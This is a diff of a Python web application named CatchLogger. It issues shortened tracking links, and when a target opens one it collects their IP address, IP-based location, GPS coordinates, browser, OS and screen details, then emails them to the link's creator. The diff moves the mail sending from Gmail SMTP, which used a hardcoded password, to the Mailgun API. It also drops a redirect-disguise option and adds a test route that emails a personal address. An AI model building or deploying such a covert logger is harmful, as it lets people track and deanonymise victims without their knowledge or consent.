@@ -1,13 +1,8 @@
 import os
-import sqlite3
-import smtplib
 import json
 import mail
 import requests
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEText import MIMEText
 from bottle import *
-from socket import gethostname, gethostbyname 
 
 
 #===============RETURN FILES===============
@@ -32,23 +27,15 @@ def shorten(link):
     return r
 
 
-def send_email(text, addr): 
-    fromaddr = "catchlogger.noreply@gmail.com"
-    toaddr = addr
-    msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "CatchLogger results"
-     
-    body = text
-    msg.attach(MIMEText(body, 'plain'))
-     
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(fromaddr, "adminpsw")
-    text = msg.as_string()
-    server.sendmail(fromaddr, toaddr, text)
-    server.quit()
+def send_simple_message(text, adr):
+    return requests.post(
+        "https://api.mailgun.net/v3/catchlogger.jkdev.ru/messages",
+        auth=("api", os.environ['MAILGUN_API_KEY']),
+        data={"from": "CatchLogger NoReply <catchlogger@jkdev.ru>",
+              "to": [adr],
+              "subject": "CatchLogger Results",
+              "html": text})
+
 
 
 #===================BODY====================
@@ -77,10 +64,7 @@ def prcss(method):
     if method == "email":
         link_addr = rq.get("link_addr")
         email = rq.get("email")
-        link = "https://catchlogger.herokuapp.com/link?whereto=%s&email=%s&method=%s" % (link_addr, email, method)
-
-        if howto == "SafeR":
-            link = "http://catchlogger.blogspot.com/p/blog-page.html?red=" + link
+        link = "http://cl.jkdev.ru/link?whereto=%s&email=%s&method=%s" % (link_addr, email, method)
 
         return shorten(link)
 
@@ -115,7 +99,7 @@ def obr():
     APIipADDR = "http://ip-api.com/json/"+ip
     ip_dic = json.loads(requests.get(APIipADDR).text)
     text = mail.text % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], d['lat'], d['long'], d['rad'], ip, ip_dic["org"], ip_dic["regionName"], ip_dic["city"])
-    send_email(text, adr)
+    send_simple_message(text, adr)
     print("SENT MAIL TO " + str(adr))
     
 
@@ -134,6 +118,9 @@ var get_rad = %s""" % (lat, lng, rad)
     locvar.close()
     return static_file("circler.html", root='.')
 
+@get("/sendnow")
+def s():
+    send_simple_message("test", "andtun@yandex.ru")
 
 
 # =========================FOR BEAUTY==========================
